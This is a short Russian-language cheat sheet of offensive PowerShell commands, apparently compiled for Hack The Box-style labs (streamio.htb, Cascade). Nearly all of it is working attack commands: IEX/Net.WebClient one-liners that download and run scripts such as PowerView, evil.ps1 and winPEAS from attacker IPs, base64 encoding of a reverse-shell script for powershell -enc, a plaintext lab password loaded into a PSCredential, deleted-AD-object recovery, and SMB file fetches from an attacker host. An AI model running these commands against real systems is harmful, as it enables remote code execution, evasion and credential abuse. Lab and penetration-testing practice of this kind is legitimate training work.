# POWER

https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/

Запустить повер виев

. .\PowerView.ps1

загрузиь повервью в память

IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15/PowerView.ps1')

Поскольку у нас нет оболочки для JDgodd, мы можем использовать PowerShell.
 System.Management.Automation.PSCredential для хранения учетных данных в нашей текущей оболочке.

 $SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd',
$SecPassword)

# Кодирование скриптов POwerShell

cat rev.ps1 |iconv -t UTF-16LE | base64 -w 0 (вывод)

powershell -enc (вывод)

# Восстаовление корзины

Get-ADObject -SearchBase "CN=Deleted Objects,DC=Cascade,DC=Local" -Filter {ObjectClass -eq "user"} -IncludeDeletedObjects -Properties *

# Загрузка скрипта и выполнение

IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/evil.ps1')

echo IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6:8000/winPEAS.ps1') | powershell -noprofile 

iwr -uri http://10.10.14.9/test -outfile test

# Доступ к ресурсу SMB

Get-Content //10.10.14.4/file
